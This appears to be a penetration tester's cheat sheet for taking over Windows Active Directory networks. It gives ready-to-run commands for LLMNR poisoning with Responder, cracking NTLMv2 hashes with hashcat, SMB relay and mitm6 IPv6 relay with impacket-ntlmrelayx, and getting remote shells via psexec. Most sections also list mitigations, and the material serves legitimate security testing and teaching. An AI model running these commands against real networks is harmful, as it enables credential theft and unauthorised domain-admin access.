https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

### LLMNR Poisoning

Set up responsder 

`responder -I eth0 -rdwv`

Works best when you expect a lot of traffic like first thing in the morning or after lunch

crack the NTLMv2 hash

`hashcat -m 5600 hash.txt wordlist.txt -O`

5600: NTLMv2 hashes
hash.txt file with hash
wordlist.txt is sometning like rockyou.txt or better
-O is for optimize

see: https://ben.the-collective.net/2019/07/10/hashcat-in-aws-ec2/

LLMNR mitigation

Turn off multicast name resolution
turn off NBT-NS

If they can't do that:
require network access control
strong passwords

### SMB Relay

* SMB signing must be disabled

#### How to ID systems with smb signing disabled

`nmap --script smb2-security-mode.nse -p 445 172.16.75.128/24`

#### Performing the SMB Relay
Edit /etc/responder/responder.conf turn off SMB and HTTP

`responder -I eth0 -rdwv`

`impacket-ntlmrelayx -tf targets.txt -smb2support`

#### SMB Relay Mitigation

* SMB Signing
* Disable NTLM authentication
* Account tiering
* Local admin restriction


### Windows Shell

1. metasploit psexec (loud and may get picked up by Windows Defender)
2. psexec.py
    `psexec.py [DOMAIN]/[USERNAME]@[IP OR MACHINE NAME]`
3. wmiexec
4. smbexec

### mitm6

`mitm6 -d DOMAIN.local`

`impacket-ntlmrelayx -6 -t ldaps://172.16.75.139 -wh fakewpad.laz.local -l lootme`

#### mitm6 mitigation

* diable ipv6
* disable WPAD w/group policy
* LDAP signing and LDAP channel binding
* Admin users to protected users group or mark admin accounts as sensitive